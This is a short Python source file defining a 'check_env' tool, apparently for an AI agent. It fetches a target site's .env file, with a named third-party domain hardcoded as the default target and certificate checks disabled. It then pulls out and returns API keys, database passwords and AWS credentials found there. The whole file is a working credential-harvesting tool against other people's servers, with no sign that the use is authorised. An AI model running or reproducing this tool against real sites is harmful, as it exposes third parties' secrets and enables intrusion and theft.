from tools.base import Tool
import requests

class CheckEnvTool(Tool):
    name = "check_env"
    description = "Fetches and analyzes environment files from a target URL."
    parameters = {"url": "Target URL to fetch the .env file from"}

    def execute(self, url: str = None, target: str = None, **kwargs) -> str:
        target_url = url or target or kwargs.get('url') or "https://scholarhub.online/.env"
        try:
            resp = requests.get(target_url, timeout=10, verify=False)
            if resp.status_code == 200:
                env_content = resp.text
                sensitive_keywords = ["API_KEY", "DB_PASSWORD", "SECRET_KEY", "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY"]
                findings = []
                for line in env_content.splitlines():
                    if any(keyword in line for keyword in sensitive_keywords):
                        findings.append(line)
                if findings:
                    return f"[WARNING] Sensitive information found in .env file:\n{chr(10).join(findings)}"
                else:
                    return "[INFO] No sensitive information found in .env file."
            else:
                return f"[ERROR] Failed to fetch .env file. HTTP Status Code: {resp.status_code}"
        except Exception as e:
            return f"[ERROR] Request failed: {str(e)}"